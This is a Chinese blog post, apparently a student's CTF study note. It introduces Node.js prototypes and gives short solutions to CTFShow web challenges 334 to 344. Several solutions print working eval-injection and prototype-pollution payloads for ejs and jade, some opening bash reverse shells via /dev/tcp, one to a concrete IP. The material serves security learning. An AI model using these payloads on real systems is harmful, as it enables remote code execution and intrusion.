@@ -1,0 +1,144 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="CTF Node.js学习       暑假回家就想开摆了，随便写写了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Node.js学习">
+<meta property="og:url" content="http://yan5ui.github.io/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="yansui&#39;s blogs">
+<meta property="og:description" content="CTF Node.js学习       暑假回家就想开摆了，随便写写了">
+<meta property="og:locale">
+<meta property="og:image" content="http://yan5ui.github.io/2023-07-13-23-02-59.png">
+<meta property="article:published_time" content="2023-07-17T03:25:01.092Z">
+<meta property="article:modified_time" content="2023-07-17T03:24:26.191Z">
+<meta property="article:author" content="yansui">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yan5ui.github.io/2023-07-13-23-02-59.png"><title>CTF Node.js学习 | yansui's blogs</title><link ref="canonical" href="http://yan5ui.github.io/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">yansui的小窝</div><div class="header-banner-info__subtitle">一个成长中的ctfer</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CTF Node.js学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-07-17</span></span></div></header><div class="post-body">
+        <h1 id="CTF-Node-js学习"   >
+          <a href="#CTF-Node-js学习" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-Node-js学习" class="headerlink" title="CTF Node.js学习"></a>CTF Node.js学习</h1>
+      <p>暑假回家就想开摆了，随便写写了</p>
+<span id="more"></span>
+
+
+        <h2 id="一、Node-js基础"   >
+          <a href="#一、Node-js基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、Node-js基础" class="headerlink" title="一、Node.js基础"></a>一、Node.js基础</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nodejs.cn/" >参考文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>个人感觉最需要注意的是什么是回调函数，经常使用且在PHP,python C&#x2F;C++中并没有出现过</p>
+
+        <h2 id="二、Node-js安全"   >
+          <a href="#二、Node-js安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、Node-js安全" class="headerlink" title="二、Node.js安全"></a>二、Node.js安全</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-0" >不错的链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1PG411774p/?spm_id_from=333.337.search-card.all.click&vd_source=66654db0160f9b7490e1f221926d79d2" >有关什么是原型和原型链</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>这里稍微写一下自己对原型和原型链的一点理解，防止学完就忘了<br>因为JavaScript中没有类的概念，要实现对象的继承就是通过原型对象来实现。<br>具体地说，对于一个对象，它会有<code>__proto__</code>属性指向这个对象的原型对象<br>对于一个函数，特别是构造器函数，会有一个<code>prototype</code>属性指向这个构造器对应的原型对象，这个对象的原型对象的构造器就是这个函数。这个函数通过new关键字可以创造一个对象。</p>
+<p>依我用面向对象的方式理解的话，原型或许就可以类比为父类？？也不知道对不对</p>
+
+        <h2 id="三、CTFShow题解"   >
+          <a href="#三、CTFShow题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CTFShow题解" class="headerlink" title="三、CTFShow题解"></a>三、CTFShow题解</h2>
+      
+        <h3 id="Web334"   >
+          <a href="#Web334" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web334" class="headerlink" title="Web334"></a>Web334</h3>
+      <p>看懂代码就行，意思是用户名!&#x3D;CTFSHOW，但是转大写之后得是CTFSHOW，密码是123456</p>
+<p>payload:<br><code>ctfshow:123456</code></p>
+
+        <h3 id="Web335"   >
+          <a href="#Web335" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web335" class="headerlink" title="Web335"></a>Web335</h3>
+      <p>使用Node.js调用系统命令</p>
+<p>方法一：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nodejs.cn/api/fs.html#fsreaddirsyncpath-options" >文件操作</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：</p>
+<blockquote>
+<p>?eval&#x3D;require(‘fs’).readdirSync(‘.’);<br>?eval&#x3D;require(‘fs’).readFileSync(‘fl00g.txt’);</p>
+</blockquote>
+<p>方法二：<br>执行系统命令</p>
+<blockquote>
+<p>?eval&#x3D;require(‘child_process’).execSync(‘ls’).toString();<br>?eval&#x3D;require(‘child_process’).spawnSync(‘cat’,[‘fl00g.txt’]).output;<br>?eval&#x3D;require(‘child_process’).spawnSync(‘cat’,[‘fl00g.txt’]).stdout;<br>?eval&#x3D;global.process.mainModule.constructor._load(‘child_process’).exec(‘ls’);</p>
+</blockquote>
+
+        <h3 id="Web336"   >
+          <a href="#Web336" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web336" class="headerlink" title="Web336"></a>Web336</h3>
+      <p>几乎跟上道题一样 </p>
+
+        <h3 id="Web337"   >
+          <a href="#Web337" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web337" class="headerlink" title="Web337"></a>Web337</h3>
+      <p>有关nodejs中的’&#x3D;&#x3D;&#x3D;’:</p>
+<blockquote>
+<p>(1) 不同类型值比较时，如果两个值的类型不同，直接返回false；<br>(2) 同一类的原始类型值（数值、字符串、布尔值）之间比较时，值相同就返回true，值不同就返回false；<br>(3) 同一类的复合类型值（对象、数组、函数）之间比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个对象；<br>(4) undefined和 null 与自身严格相等。</p>
+</blockquote>
+<p>payload:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=1 //为啥a[]=2&amp;b[]=1不行我也不知道</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Web338"   >
+          <a href="#Web338" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web338" class="headerlink" title="Web338"></a>Web338</h3>
+      <p>开始原型链污染了 不会了(悲</p>
+<p><img src="/2023-07-13-23-02-59.png"></p>
+<p>payload:<br><code>&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</code></p>
+
+        <h3 id="Web339-amp-Web340"   >
+          <a href="#Web339-amp-Web340" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web339-amp-Web340" class="headerlink" title="Web339&amp;Web340"></a>Web339&amp;Web340</h3>
+      <blockquote>
+<p>表达式 Function(query)(query) 的作用是将字符串 query 解析为一个函数，并将其执行。换句话说，它将字符串 query 当作函数体来解析，并立即执行。这样的写法常用于动态执行字符串形式的 JavaScript 代码。</p>
+</blockquote>
+<p>所以只要污染Object.porototype中的query对象即可</p>
+<p>payload:</p>
+<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>先在主页GUI登录，直接抓包改payload（只有一次机会！！！），然后直接访问&#x2F;api</p>
+
+        <h3 id="Web341"   >
+          <a href="#Web341" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web341" class="headerlink" title="Web341"></a>Web341</h3>
+      <p>ejs rce<br>payload:</p>
+<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Web342"   >
+          <a href="#Web342" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web342" class="headerlink" title="Web342"></a>Web342</h3>
+      <p>jade模板RCE，抄的别的大佬的wp</p>
+<p>payload:</p>
+<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/121.37.219.181/7777 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Web343"   >
+          <a href="#Web343" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web343" class="headerlink" title="Web343"></a>Web343</h3>
+      <p>同上。</p>
+
+        <h3 id="Web344"   >
+          <a href="#Web344" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web344" class="headerlink" title="Web344"></a>Web344</h3>
+      <p>payload:</p>
+<blockquote>
+<p>?query&#x3D;{“name”:”admin”&amp;query&#x3D;”password”:”%63tfshow”&amp;query&#x3D;”isVIP”:true}</p>
+</blockquote>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://yan5ui.github.io">yansui</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://yan5ui.github.io/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">http://yan5ui.github.io/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2023/07/12/Java/"><span class="paginator-prev__text">CTF:JAVA Web学习记录与总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-Node-js%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">
+          CTF Node.js学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Node-js%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">
+          一、Node.js基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Node-js%E5%AE%89%E5%85%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
+          二、Node.js安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81CTFShow%E9%A2%98%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">
+          三、CTFShow题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web334"><span class="toc-number">1.3.1.</span> <span class="toc-text">
+          Web334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web335"><span class="toc-number">1.3.2.</span> <span class="toc-text">
+          Web335</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web336"><span class="toc-number">1.3.3.</span> <span class="toc-text">
+          Web336</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web337"><span class="toc-number">1.3.4.</span> <span class="toc-text">
+          Web337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web338"><span class="toc-number">1.3.5.</span> <span class="toc-text">
+          Web338</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web339-amp-Web340"><span class="toc-number">1.3.6.</span> <span class="toc-text">
+          Web339&amp;Web340</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web341"><span class="toc-number">1.3.7.</span> <span class="toc-text">
+          Web341</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web342"><span class="toc-number">1.3.8.</span> <span class="toc-text">
+          Web342</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web343"><span class="toc-number">1.3.9.</span> <span class="toc-text">
+          Web343</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web344"><span class="toc-number">1.3.10.</span> <span class="toc-text">
+          Web344</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/photo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">yansui</p></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
